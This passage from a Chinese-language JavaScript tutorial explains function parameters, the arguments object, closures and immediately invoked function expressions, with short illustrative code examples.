\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 foo \u5185\u90e8\u58f0\u660e\u4e86\u4e00\u4e2a\u51fd\u6570 bar \uff0c bar \u7684\u4f5c\u7528\u57df\u7ed1\u5b9a foo \u3002\u5f53\u6211\u4eec\u5728 foo \u5916\u90e8\u53d6\u51fa bar \u6267\u884c\u65f6\uff0c\u53d8\u91cf x \u6307\u5411\u7684\u662f foo \u5185\u90e8\u7684 x \uff0c\u800c\u4e0d\u662f foo \u5916\u90e8\u7684 x \u3002\u6b63\u662f\u8fd9\u79cd\u673a\u5236\uff0c\u6784\u6210\u4e86\u4e0b\u6587\u8981\u8bb2\u89e3\u7684\u201c\u95ed\u5305\u201d\u73b0\u8c61\u3002 \u53c2\u6570 \u00b6 \u6982\u8ff0 \u00b6 \u51fd\u6570\u8fd0\u884c\u7684\u65f6\u5019\uff0c\u6709\u65f6\u9700\u8981\u63d0\u4f9b\u5916\u90e8\u6570\u636e\uff0c\u4e0d\u540c\u7684\u5916\u90e8\u6570\u636e\u4f1a\u5f97\u5230\u4e0d\u540c\u7684\u7ed3\u679c\uff0c\u8fd9\u79cd\u5916\u90e8\u6570\u636e\u5c31\u53eb\u53c2\u6570\u3002 1 2 3 4 5 6 function square ( x ) { return x * x ; } square ( 2 ) // 4 square ( 3 ) // 9 \u4e0a\u5f0f\u7684 x \u5c31\u662f square \u51fd\u6570\u7684\u53c2\u6570\u3002\u6bcf\u6b21\u8fd0\u884c\u7684\u65f6\u5019\uff0c\u9700\u8981\u63d0\u4f9b\u8fd9\u4e2a\u503c\uff0c\u5426\u5219\u5f97\u4e0d\u5230\u7ed3\u679c\u3002 \u53c2\u6570\u7684\u7701\u7565 \u00b6 \u51fd\u6570\u53c2\u6570\u4e0d\u662f\u5fc5\u9700\u7684\uff0cJavaScript \u5141\u8bb8\u7701\u7565\u53c2\u6570\u3002 1 2 3 4 5 6 7 8 9 function f ( a , b ) { return a ; } f ( 1 , 2 , 3 ) // 1 f ( 1 ) // 1 f () // undefined f . length // 2 \u4e0a\u9762\u4ee3\u7801\u7684\u51fd\u6570 f \u5b9a\u4e49\u4e86\u4e24\u4e2a\u53c2\u6570\uff0c\u4f46\u662f\u8fd0\u884c\u65f6\u65e0\u8bba\u63d0\u4f9b\u591a\u5c11\u4e2a\u53c2\u6570\uff08\u6216\u8005\u4e0d\u63d0\u4f9b\u53c2\u6570\uff09\uff0cJavaScript \u90fd\u4e0d\u4f1a\u62a5\u9519\u3002\u7701\u7565\u7684\u53c2\u6570\u7684\u503c\u5c31\u53d8\u4e3a undefined \u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u51fd\u6570\u7684 length \u5c5e\u6027\u4e0e\u5b9e\u9645\u4f20\u5165\u7684\u53c2\u6570\u4e2a\u6570\u65e0\u5173\uff0c\u53ea\u53cd\u6620\u51fd\u6570\u9884\u671f\u4f20\u5165\u7684\u53c2\u6570\u4e2a\u6570\u3002 \u4f46\u662f\uff0c\u6ca1\u6709\u529e\u6cd5\u53ea\u7701\u7565\u9760\u524d\u7684\u53c2\u6570\uff0c\u800c\u4fdd\u7559\u9760\u540e\u7684\u53c2\u6570\u3002\u5982\u679c\u4e00\u5b9a\u8981\u7701\u7565\u9760\u524d\u7684\u53c2\u6570\uff0c\u53ea\u6709\u663e\u5f0f\u4f20\u5165 undefined \u3002 1 2 3 4 5 6 function f ( a , b ) { return a ; } f ( , 1 ) // SyntaxError: Unexpected token ,(\u2026) f ( undefined , 1 ) // undefined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u7701\u7565\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u5c31\u4f1a\u62a5\u9519\u3002 \u4f20\u9012\u65b9\u5f0f \u00b6 \u51fd\u6570\u53c2\u6570\u5982\u679c\u662f\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff08\u6570\u503c\u3001\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\uff09\uff0c\u4f20\u9012\u65b9\u5f0f\u662f\u4f20\u503c\u4f20\u9012\uff08passes by value\uff09\u3002\u8fd9\u610f\u5473\u7740\uff0c\u5728\u51fd\u6570\u4f53\u5185\u4fee\u6539\u53c2\u6570\u503c\uff0c\u4e0d\u4f1a\u5f71\u54cd\u5230\u51fd\u6570\u5916\u90e8\u3002 1 2 3 4 5 6 7 8 var p = 2 ; function f ( p ) { p = 3 ; } f ( p ); p // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf p \u662f\u4e00\u4e2a\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u4f20\u5165\u51fd\u6570 f \u7684\u65b9\u5f0f\u662f\u4f20\u503c\u4f20\u9012\u3002\u56e0\u6b64\uff0c\u5728\u51fd\u6570\u5185\u90e8\uff0c p \u7684\u503c\u662f\u539f\u59cb\u503c\u7684\u62f7\u8d1d\uff0c\u65e0\u8bba\u600e\u4e48\u4fee\u6539\uff0c\u90fd\u4e0d\u4f1a\u5f71\u54cd\u5230\u539f\u59cb\u503c\u3002 \u4f46\u662f\uff0c\u5982\u679c\u51fd\u6570\u53c2\u6570\u662f\u590d\u5408\u7c7b\u578b\u7684\u503c\uff08\u6570\u7ec4\u3001\u5bf9\u8c61\u3001\u5176\u4ed6\u51fd\u6570\uff09\uff0c\u4f20\u9012\u65b9\u5f0f\u662f\u4f20\u5740\u4f20\u9012\uff08pass by reference\uff09\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4f20\u5165\u51fd\u6570\u7684\u539f\u59cb\u503c\u7684\u5730\u5740\uff0c\u56e0\u6b64\u5728\u51fd\u6570\u5185\u90e8\u4fee\u6539\u53c2\u6570\uff0c\u5c06\u4f1a\u5f71\u54cd\u5230\u539f\u59cb\u503c\u3002 1 2 3 4 5 6 7 8 var obj = { p : 1 }; function f ( o ) { o . p = 2 ; } f ( obj ); obj . p // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4f20\u5165\u51fd\u6570 f \u7684\u662f\u53c2\u6570\u5bf9\u8c61 obj \u7684\u5730\u5740\u3002\u56e0\u6b64\uff0c\u5728\u51fd\u6570\u5185\u90e8\u4fee\u6539 obj \u7684\u5c5e\u6027 p \uff0c\u4f1a\u5f71\u54cd\u5230\u539f\u59cb\u503c\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u51fd\u6570\u5185\u90e8\u4fee\u6539\u7684\uff0c\u4e0d\u662f\u53c2\u6570\u5bf9\u8c61\u7684\u67d0\u4e2a\u5c5e\u6027\uff0c\u800c\u662f\u66ff\u6362\u6389\u6574\u4e2a\u53c2\u6570\uff0c\u8fd9\u65f6\u4e0d\u4f1a\u5f71\u54cd\u5230\u539f\u59cb\u503c\u3002 1 2 3 4 5 6 7 8 var obj = [ 1 , 2 , 3 ]; function f ( o ) { o = [ 2 , 3 , 4 ]; } f ( obj ); obj // [1, 2, 3] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5728\u51fd\u6570 f() \u5185\u90e8\uff0c\u53c2\u6570\u5bf9\u8c61 obj \u88ab\u6574\u4e2a\u66ff\u6362\u6210\u53e6\u4e00\u4e2a\u503c\u3002\u8fd9\u65f6\u4e0d\u4f1a\u5f71\u54cd\u5230\u539f\u59cb\u503c\u3002\u8fd9\u662f\u56e0\u4e3a\uff0c\u5f62\u5f0f\u53c2\u6570\uff08 o \uff09\u7684\u503c\u5b9e\u9645\u662f\u53c2\u6570 obj \u7684\u5730\u5740\uff0c\u91cd\u65b0\u5bf9 o \u8d4b\u503c\u5bfc\u81f4 o \u6307\u5411\u53e6\u4e00\u4e2a\u5730\u5740\uff0c\u4fdd\u5b58\u5728\u539f\u5730\u5740\u4e0a\u7684\u503c\u5f53\u7136\u4e0d\u53d7\u5f71\u54cd\u3002 \u540c\u540d\u53c2\u6570 \u00b6 \u5982\u679c\u6709\u540c\u540d\u7684\u53c2\u6570\uff0c\u5219\u53d6\u6700\u540e\u51fa\u73b0\u7684\u90a3\u4e2a\u503c\u3002 1 2 3 4 5 function f ( a , a ) { console . log ( a ); } f ( 1 , 2 ) // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f() \u6709\u4e24\u4e2a\u53c2\u6570\uff0c\u4e14\u53c2\u6570\u540d\u90fd\u662f a \u3002\u53d6\u503c\u7684\u65f6\u5019\uff0c\u4ee5\u540e\u9762\u7684 a \u4e3a\u51c6\uff0c\u5373\u4f7f\u540e\u9762\u7684 a \u6ca1\u6709\u503c\u6216\u88ab\u7701\u7565\uff0c\u4e5f\u662f\u4ee5\u5176\u4e3a\u51c6\u3002 1 2 3 4 5 function f ( a , a ) { console . log ( a ); } f ( 1 ) // undefined \u8c03\u7528\u51fd\u6570 f() \u7684\u65f6\u5019\uff0c\u6ca1\u6709\u63d0\u4f9b\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c a \u7684\u53d6\u503c\u5c31\u53d8\u6210\u4e86 undefined \u3002\u8fd9\u65f6\uff0c\u5982\u679c\u8981\u83b7\u5f97\u7b2c\u4e00\u4e2a a \u7684\u503c\uff0c\u53ef\u4ee5\u4f7f\u7528 arguments \u5bf9\u8c61\u3002 1 2 3 4 5 function f ( a , a ) { console . log ( arguments [ 0 ]); } f ( 1 ) // 1 arguments \u5bf9\u8c61 \u00b6 \uff081\uff09\u5b9a\u4e49 \u7531\u4e8e JavaScript \u5141\u8bb8\u51fd\u6570\u6709\u4e0d\u5b9a\u6570\u76ee\u7684\u53c2\u6570\uff0c\u6240\u4ee5\u9700\u8981\u4e00\u79cd\u673a\u5236\uff0c\u53ef\u4ee5\u5728\u51fd\u6570\u4f53\u5185\u90e8\u8bfb\u53d6\u6240\u6709\u53c2\u6570\u3002\u8fd9\u5c31\u662f arguments \u5bf9\u8c61\u7684\u7531\u6765\u3002 arguments \u5bf9\u8c61\u5305\u542b\u4e86\u51fd\u6570\u8fd0\u884c\u65f6\u7684\u6240\u6709\u53c2\u6570\uff0c arguments[0] \u5c31\u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c arguments[1] \u5c31\u662f\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002\u8fd9\u4e2a\u5bf9\u8c61\u53ea\u6709\u5728\u51fd\u6570\u4f53\u5185\u90e8\uff0c\u624d\u53ef\u4ee5\u4f7f\u7528\u3002 1 2 3 4 5 6 7 8 9 10 var f = function ( one ) { console . log ( arguments [ 0 ]); console . log ( arguments [ 1 ]); console . log ( arguments [ 2 ]); } f ( 1 , 2 , 3 ) // 1 // 2 // 3 \u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0c arguments \u5bf9\u8c61\u53ef\u4ee5\u5728\u8fd0\u884c\u65f6\u4fee\u6539\u3002 1 2 3 4 5 6 7 var f = function ( a , b ) { arguments [ 0 ] = 3 ; arguments [ 1 ] = 2 ; return a + b ; } f ( 1 , 1 ) // 5 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f() \u8c03\u7528\u65f6\u4f20\u5165\u7684\u53c2\u6570\uff0c\u5728\u51fd\u6570\u5185\u90e8\u88ab\u4fee\u6539\u6210 3 \u548c 2 \u3002 \u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c arguments \u5bf9\u8c61\u4e0e\u51fd\u6570\u53c2\u6570\u4e0d\u5177\u6709\u8054\u52a8\u5173\u7cfb\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4fee\u6539 arguments \u5bf9\u8c61\u4e0d\u4f1a\u5f71\u54cd\u5230\u5b9e\u9645\u7684\u51fd\u6570\u53c2\u6570\u3002 1 2 3 4 5 6 7 8 var f = function ( a , b ) { 'use strict' ; // \u5f00\u542f\u4e25\u683c\u6a21\u5f0f arguments [ 0 ] = 3 ; arguments [ 1 ] = 2 ; return a + b ; } f ( 1 , 1 ) // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570\u4f53\u5185\u662f\u4e25\u683c\u6a21\u5f0f\uff0c\u8fd9\u65f6\u4fee\u6539 arguments \u5bf9\u8c61\uff0c\u4e0d\u4f1a\u5f71\u54cd\u5230\u771f\u5b9e\u53c2\u6570 a \u548c b \u3002 \u901a\u8fc7 arguments \u5bf9\u8c61\u7684 length \u5c5e\u6027\uff0c\u53ef\u4ee5\u5224\u65ad\u51fd\u6570\u8c03\u7528\u65f6\u5230\u5e95\u5e26\u51e0\u4e2a\u53c2\u6570\u3002 1 2 3 4 5 6 7 function f () { return arguments . length ; } f ( 1 , 2 , 3 ) // 3 f ( 1 ) // 1 f () // 0 \uff082\uff09\u4e0e\u6570\u7ec4\u7684\u5173\u7cfb \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u867d\u7136 arguments \u5f88\u50cf\u6570\u7ec4\uff0c\u4f46\u5b83\u662f\u4e00\u4e2a\u5bf9\u8c61\u3002\u6570\u7ec4\u4e13\u6709\u7684\u65b9\u6cd5\uff08\u6bd4\u5982 slice \u548c forEach \uff09\uff0c\u4e0d\u80fd\u5728 arguments \u5bf9\u8c61\u4e0a\u76f4\u63a5\u4f7f\u7528\u3002 \u5982\u679c\u8981\u8ba9 arguments \u5bf9\u8c61\u4f7f\u7528\u6570\u7ec4\u65b9\u6cd5\uff0c\u771f\u6b63\u7684\u89e3\u51b3\u65b9\u6cd5\u662f\u5c06 arguments \u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\u3002\u4e0b\u9762\u662f\u4e24\u79cd\u5e38\u7528\u7684\u8f6c\u6362\u65b9\u6cd5\uff1a slice \u65b9\u6cd5\u548c\u9010\u4e00\u586b\u5165\u65b0\u6570\u7ec4\u3002 1 2 3 4 5 6 7 var args = Array . prototype . slice . call ( arguments ); // \u6216\u8005 var args = []; for ( var i = 0 ; i < arguments . length ; i ++ ) { args . push ( arguments [ i ]); } \uff083\uff09callee \u5c5e\u6027 arguments \u5bf9\u8c61\u5e26\u6709\u4e00\u4e2a callee \u5c5e\u6027\uff0c\u8fd4\u56de\u5b83\u6240\u5bf9\u5e94\u7684\u539f\u51fd\u6570\u3002 1 2 3 4 5 var f = function () { console . log ( arguments . callee === f ); } f () // true \u53ef\u4ee5\u901a\u8fc7 arguments.callee \uff0c\u8fbe\u5230\u8c03\u7528\u51fd\u6570\u81ea\u8eab\u7684\u76ee\u7684\u3002\u8fd9\u4e2a\u5c5e\u6027\u5728\u4e25\u683c\u6a21\u5f0f\u91cc\u9762\u662f\u7981\u7528\u7684\uff0c\u56e0\u6b64\u4e0d\u5efa\u8bae\u4f7f\u7528\u3002 \u51fd\u6570\u7684\u5176\u4ed6\u77e5\u8bc6\u70b9 \u00b6 \u95ed\u5305 \u00b6 \u95ed\u5305\uff08closure\uff09\u662f JavaScript \u8bed\u8a00\u7684\u4e00\u4e2a\u96be\u70b9\uff0c\u4e5f\u662f\u5b83\u7684\u7279\u8272\uff0c\u5f88\u591a\u9ad8\u7ea7\u5e94\u7528\u90fd\u8981\u4f9d\u9760\u95ed\u5305\u5b9e\u73b0\u3002 \u7406\u89e3\u95ed\u5305\uff0c\u9996\u5148\u5fc5\u987b\u7406\u89e3\u53d8\u91cf\u4f5c\u7528\u57df\u3002\u524d\u9762\u63d0\u5230\uff0cJavaScript \u6709\u4e24\u79cd\u4f5c\u7528\u57df\uff1a\u5168\u5c40\u4f5c\u7528\u57df\u548c\u51fd\u6570\u4f5c\u7528\u57df\u3002\u51fd\u6570\u5185\u90e8\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6\u5168\u5c40\u53d8\u91cf\u3002 1 2 3 4 5 6 var n = 999 ; function f1 () { console . log ( n ); } f1 () // 999 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f1 \u53ef\u4ee5\u8bfb\u53d6\u5168\u5c40\u53d8\u91cf n \u3002 \u4f46\u662f\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u51fd\u6570\u5916\u90e8\u65e0\u6cd5\u8bfb\u53d6\u51fd\u6570\u5185\u90e8\u58f0\u660e\u7684\u53d8\u91cf\u3002 1 2 3 4 5 6 function f1 () { var n = 999 ; } console . log ( n ) // Uncaught ReferenceError: n is not defined( \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f1 \u5185\u90e8\u58f0\u660e\u7684\u53d8\u91cf n \uff0c\u51fd\u6570\u5916\u662f\u65e0\u6cd5\u8bfb\u53d6\u7684\u3002 \u5982\u679c\u51fa\u4e8e\u79cd\u79cd\u539f\u56e0\uff0c\u9700\u8981\u5f97\u5230\u51fd\u6570\u5185\u7684\u5c40\u90e8\u53d8\u91cf\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd9\u662f\u529e\u4e0d\u5230\u7684\uff0c\u53ea\u6709\u901a\u8fc7\u53d8\u901a\u65b9\u6cd5\u624d\u80fd\u5b9e\u73b0\u3002\u90a3\u5c31\u662f\u5728\u51fd\u6570\u7684\u5185\u90e8\uff0c\u518d\u5b9a\u4e49\u4e00\u4e2a\u51fd\u6570\u3002 1 2 3 4 5 6 function f1 () { var n = 999 ; function f2 () { \u3000\u3000 console . log ( n ); // 999 } } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f2 \u5c31\u5728\u51fd\u6570 f1 \u5185\u90e8\uff0c\u8fd9\u65f6 f1 \u5185\u90e8\u7684\u6240\u6709\u5c40\u90e8\u53d8\u91cf\uff0c\u5bf9 f2 \u90fd\u662f\u53ef\u89c1\u7684\u3002\u4f46\u662f\u53cd\u8fc7\u6765\u5c31\u4e0d\u884c\uff0c f2 \u5185\u90e8\u7684\u5c40\u90e8\u53d8\u91cf\uff0c\u5bf9 f1 \u5c31\u662f\u4e0d\u53ef\u89c1\u7684\u3002\u8fd9\u5c31\u662f JavaScript \u8bed\u8a00\u7279\u6709\u7684\"\u94fe\u5f0f\u4f5c\u7528\u57df\"\u7ed3\u6784\uff08chain scope\uff09\uff0c\u5b50\u5bf9\u8c61\u4f1a\u4e00\u7ea7\u4e00\u7ea7\u5730\u5411\u4e0a\u5bfb\u627e\u6240\u6709\u7236\u5bf9\u8c61\u7684\u53d8\u91cf\u3002\u6240\u4ee5\uff0c\u7236\u5bf9\u8c61\u7684\u6240\u6709\u53d8\u91cf\uff0c\u5bf9\u5b50\u5bf9\u8c61\u90fd\u662f\u53ef\u89c1\u7684\uff0c\u53cd\u4e4b\u5219\u4e0d\u6210\u7acb\u3002 \u65e2\u7136 f2 \u53ef\u4ee5\u8bfb\u53d6 f1 \u7684\u5c40\u90e8\u53d8\u91cf\uff0c\u90a3\u4e48\u53ea\u8981\u628a f2 \u4f5c\u4e3a\u8fd4\u56de\u503c\uff0c\u6211\u4eec\u4e0d\u5c31\u53ef\u4ee5\u5728 f1 \u5916\u90e8\u8bfb\u53d6\u5b83\u7684\u5185\u90e8\u53d8\u91cf\u4e86\u5417\uff01 1 2 3 4 5 6 7 8 9 10 function f1 () { var n = 999 ; function f2 () { console . log ( n ); } return f2 ; } var result = f1 (); result (); // 999 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f1 \u7684\u8fd4\u56de\u503c\u5c31\u662f\u51fd\u6570 f2 \uff0c\u7531\u4e8e f2 \u53ef\u4ee5\u8bfb\u53d6 f1 \u7684\u5185\u90e8\u53d8\u91cf\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u5728\u5916\u90e8\u83b7\u5f97 f1 \u7684\u5185\u90e8\u53d8\u91cf\u4e86\u3002 \u95ed\u5305\u5c31\u662f\u51fd\u6570 f2 \uff0c\u5373\u80fd\u591f\u8bfb\u53d6\u5176\u4ed6\u51fd\u6570\u5185\u90e8\u53d8\u91cf\u7684\u51fd\u6570\u3002\u7531\u4e8e\u5728 JavaScript \u8bed\u8a00\u4e2d\uff0c\u53ea\u6709\u51fd\u6570\u5185\u90e8\u7684\u5b50\u51fd\u6570\u624d\u80fd\u8bfb\u53d6\u5185\u90e8\u53d8\u91cf\uff0c\u56e0\u6b64\u53ef\u4ee5\u628a\u95ed\u5305\u7b80\u5355\u7406\u89e3\u6210\u201c\u5b9a\u4e49\u5728\u4e00\u4e2a\u51fd\u6570\u5185\u90e8\u7684\u51fd\u6570\u201d\u3002\u95ed\u5305\u6700\u5927\u7684\u7279\u70b9\uff0c\u5c31\u662f\u5b83\u53ef\u4ee5\u201c\u8bb0\u4f4f\u201d\u8bde\u751f\u7684\u73af\u5883\uff0c\u6bd4\u5982 f2 \u8bb0\u4f4f\u4e86\u5b83\u8bde\u751f\u7684\u73af\u5883 f1 \uff0c\u6240\u4ee5\u4ece f2 \u53ef\u4ee5\u5f97\u5230 f1 \u7684\u5185\u90e8\u53d8\u91cf\u3002\u5728\u672c\u8d28\u4e0a\uff0c\u95ed\u5305\u5c31\u662f\u5c06\u51fd\u6570\u5185\u90e8\u548c\u51fd\u6570\u5916\u90e8\u8fde\u63a5\u8d77\u6765\u7684\u4e00\u5ea7\u6865\u6881\u3002 \u95ed\u5305\u7684\u6700\u5927\u7528\u5904\u6709\u4e24\u4e2a\uff0c\u4e00\u4e2a\u662f\u53ef\u4ee5\u8bfb\u53d6\u5916\u5c42\u51fd\u6570\u5185\u90e8\u7684\u53d8\u91cf\uff0c\u53e6\u4e00\u4e2a\u5c31\u662f\u8ba9\u8fd9\u4e9b\u53d8\u91cf\u59cb\u7ec8\u4fdd\u6301\u5728\u5185\u5b58\u4e2d\uff0c\u5373\u95ed\u5305\u53ef\u4ee5\u4f7f\u5f97\u5b83\u8bde\u751f\u73af\u5883\u4e00\u76f4\u5b58\u5728\u3002\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\uff0c\u95ed\u5305\u4f7f\u5f97\u5185\u90e8\u53d8\u91cf\u8bb0\u4f4f\u4e0a\u4e00\u6b21\u8c03\u7528\u65f6\u7684\u8fd0\u7b97\u7ed3\u679c\u3002 1 2 3 4 5 6 7 8 9 10 11 function createIncrementor ( start ) { return function () { return start ++ ; }; } var inc = createIncrementor ( 5 ); inc () // 5 inc () // 6 inc () // 7 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c start \u662f\u51fd\u6570 createIncrementor \u7684\u5185\u90e8\u53d8\u91cf\u3002\u901a\u8fc7\u95ed\u5305\uff0c start \u7684\u72b6\u6001\u88ab\u4fdd\u7559\u4e86\uff0c\u6bcf\u4e00\u6b21\u8c03\u7528\u90fd\u662f\u5728\u4e0a\u4e00\u6b21\u8c03\u7528\u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u8ba1\u7b97\u3002\u4ece\u4e2d\u53ef\u4ee5\u770b\u5230\uff0c\u95ed\u5305 inc \u4f7f\u5f97\u51fd\u6570 createIncrementor \u7684\u5185\u90e8\u73af\u5883\uff0c\u4e00\u76f4\u5b58\u5728\u3002\u6240\u4ee5\uff0c\u95ed\u5305\u53ef\u4ee5\u770b\u4f5c\u662f\u51fd\u6570\u5185\u90e8\u4f5c\u7528\u57df\u7684\u4e00\u4e2a\u63a5\u53e3\u3002 \u4e3a\u4ec0\u4e48\u95ed\u5305\u80fd\u591f\u8fd4\u56de\u5916\u5c42\u51fd\u6570\u7684\u5185\u90e8\u53d8\u91cf\uff1f\u539f\u56e0\u662f\u95ed\u5305\uff08\u4e0a\u4f8b\u7684 inc \uff09\u7528\u5230\u4e86\u5916\u5c42\u53d8\u91cf\uff08 start \uff09\uff0c\u5bfc\u81f4\u5916\u5c42\u51fd\u6570\uff08 createIncrementor \uff09\u4e0d\u80fd\u4ece\u5185\u5b58\u91ca\u653e\u3002\u53ea\u8981\u95ed\u5305\u6ca1\u6709\u88ab\u5783\u573e\u56de\u6536\u673a\u5236\u6e05\u9664\uff0c\u5916\u5c42\u51fd\u6570\u63d0\u4f9b\u7684\u8fd0\u884c\u73af\u5883\u4e5f\u4e0d\u4f1a\u88ab\u6e05\u9664\uff0c\u5b83\u7684\u5185\u90e8\u53d8\u91cf\u5c31\u59cb\u7ec8\u4fdd\u5b58\u7740\u5f53\u524d\u503c\uff0c\u4f9b\u95ed\u5305\u8bfb\u53d6\u3002 \u95ed\u5305\u7684\u53e6\u4e00\u4e2a\u7528\u5904\uff0c\u662f\u5c01\u88c5\u5bf9\u8c61\u7684\u79c1\u6709\u5c5e\u6027\u548c\u79c1\u6709\u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function Person ( name ) { var _age ; function setAge ( n ) { _age = n ; } function getAge () { return _age ; } return { name : name , getAge : getAge , setAge : setAge }; } var p1 = Person ( '\u5f20\u4e09' ); p1 . setAge ( 25 ); p1 . getAge () // 25 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 Person \u7684\u5185\u90e8\u53d8\u91cf _age \uff0c\u901a\u8fc7\u95ed\u5305 getAge \u548c setAge \uff0c\u53d8\u6210\u4e86\u8fd4\u56de\u5bf9\u8c61 p1 \u7684\u79c1\u6709\u53d8\u91cf\u3002 \u6ce8\u610f\uff0c\u5916\u5c42\u51fd\u6570\u6bcf\u6b21\u8fd0\u884c\uff0c\u90fd\u4f1a\u751f\u6210\u4e00\u4e2a\u65b0\u7684\u95ed\u5305\uff0c\u800c\u8fd9\u4e2a\u95ed\u5305\u53c8\u4f1a\u4fdd\u7559\u5916\u5c42\u51fd\u6570\u7684\u5185\u90e8\u53d8\u91cf\uff0c\u6240\u4ee5\u5185\u5b58\u6d88\u8017\u5f88\u5927\u3002\u56e0\u6b64\u4e0d\u80fd\u6ee5\u7528\u95ed\u5305\uff0c\u5426\u5219\u4f1a\u9020\u6210\u7f51\u9875\u7684\u6027\u80fd\u95ee\u9898\u3002 \u7acb\u5373\u8c03\u7528\u7684\u51fd\u6570\u8868\u8fbe\u5f0f\uff08IIFE\uff09 \u00b6 \u6839\u636e JavaScript \u7684\u8bed\u6cd5\uff0c\u5706\u62ec\u53f7 () \u8ddf\u5728\u51fd\u6570\u540d\u4e4b\u540e\uff0c\u8868\u793a\u8c03\u7528\u8be5\u51fd\u6570\u3002\u6bd4\u5982\uff0c print() \u5c31\u8868\u793a\u8c03\u7528 print \u51fd\u6570\u3002 \u6709\u65f6\uff0c\u6211\u4eec\u9700\u8981\u5728\u5b9a\u4e49\u51fd\u6570\u4e4b\u540e\uff0c\u7acb\u5373\u8c03\u7528\u8be5\u51fd\u6570\u3002\u8fd9\u65f6\uff0c\u4f60\u4e0d\u80fd\u5728\u51fd\u6570\u7684\u5b9a\u4e49\u4e4b\u540e\u52a0\u4e0a\u5706\u62ec\u53f7\uff0c\u8fd9\u4f1a\u4ea7\u751f\u8bed\u6cd5\u9519\u8bef\u3002 1 2 function (){ /* code */ }(); // SyntaxError: Unexpected token ( \u4ea7\u751f\u8fd9\u4e2a\u9519\u8bef\u7684\u539f\u56e0\u662f\uff0c function \u8fd9\u4e2a\u5173\u952e\u5b57\u65e2\u53ef\u4ee5\u5f53\u4f5c\u8bed\u53e5\uff0c\u4e5f\u53ef\u4ee5\u5f53\u4f5c\u8868\u8fbe\u5f0f\u3002 1 2 3 4 5 // \u8bed\u53e5 function f () {} // \u8868\u8fbe\u5f0f var f = function f () {} \u5f53\u4f5c\u8868\u8fbe\u5f0f\u65f6\uff0c\u51fd\u6570\u53ef\u4ee5\u5b9a\u4e49\u540e\u76f4\u63a5\u52a0\u5706\u62ec\u53f7\u8c03\u7528\u3002 1 2 var f = function f (){ return 1 }(); f // 1 \u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570\u5b9a\u4e49\u540e\u76f4\u63a5\u52a0\u5706\u62ec\u53f7\u8c03\u7528\uff0c\u6ca1\u6709\u62a5\u9519\u3002\u539f\u56e0\u5c31\u662f function \u4f5c\u4e3a\u8868\u8fbe\u5f0f\uff0c\u5f15\u64ce\u5c31\u628a\u51fd\u6570\u5b9a\u4e49\u5f53\u4f5c\u4e00\u4e2a\u503c\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5c31\u4e0d\u4f1a\u62a5\u9519\u3002 \u4e3a\u4e86\u907f\u514d\u89e3\u6790\u7684\u6b67\u4e49\uff0cJavaScript \u89c4\u5b9a\uff0c\u5982\u679c function \u5173\u952e\u5b57\u51fa\u73b0\u5728\u884c\u9996\uff0c\u4e00\u5f8b\u89e3\u91ca\u6210\u8bed\u53e5\u3002\u56e0\u6b64\uff0c\u5f15\u64ce\u770b\u5230\u884c\u9996\u662f function \u5173\u952e\u5b57\u4e4b\u540e\uff0c\u8ba4\u4e3a\u8fd9\u4e00\u6bb5\u90fd\u662f\u51fd\u6570\u7684\u5b9a\u4e49\uff0c\u4e0d\u5e94\u8be5\u4ee5\u5706\u62ec\u53f7\u7ed3\u5c3e\uff0c\u6240\u4ee5\u5c31\u62a5\u9519\u4e86\u3002 \u51fd\u6570\u5b9a\u4e49\u540e\u7acb\u5373\u8c03\u7528\u7684\u89e3\u51b3\u65b9\u6cd5\uff0c\u5c31\u662f\u4e0d\u8981\u8ba9 function \u51fa\u73b0\u5728\u884c\u9996\uff0c\u8ba9\u5f15\u64ce\u5c06\u5176\u7406\u89e3\u6210\u4e00\u4e2a\u8868\u8fbe\u5f0f\u3002\u6700\u7b80\u5355\u7684\u5904\u7406\uff0c\u5c31\u662f\u5c06\u5176\u653e\u5728\u4e00\u4e2a\u5706\u62ec\u53f7\u91cc\u9762\u3002 1 2 3 ( function (){ /* code */ }()); // \u6216\u8005 ( function (){ /* code */ })(); 